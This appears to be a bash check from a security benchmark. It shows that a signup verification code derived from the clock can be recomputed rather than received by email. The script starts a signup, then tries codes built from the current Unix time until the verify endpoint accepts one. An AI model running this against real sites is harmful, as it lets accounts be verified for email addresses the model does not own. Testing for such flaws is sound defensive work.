#!/usr/bin/env bash
# SIGNUP-TOKEN-001 (CWE-330/640): the emailed verification code is derived from
# the clock, so it can be recomputed instead of received. Never reads the inbox.
set -e; . "$(dirname "$0")/_lib.sh"
EMAIL="predict-$$@bench.local"
DRAFT=$(curl -s -X POST "$TARGET/api/signup/start" -H 'content-type: application/json' \
  -d "{\"email\":\"$EMAIL\"}" | json_get draftId)
[ -n "$DRAFT" ]
# recompute the code from the wall clock, allowing a few seconds of skew
for OFF in 0 -1 1 -2 2 -3 3; do
  CODE=$(python3 -c "import time,sys;print(str(int(time.time())+$OFF)[-6:])")
  OK=$(curl -s -X POST "$TARGET/api/signup/verify" -H 'content-type: application/json' \
    -d "{\"draftId\":$DRAFT,\"code\":\"$CODE\"}" | grep -c '"ok":true' || true)
  [ "$OK" = "1" ] && exit 0
done
exit 1
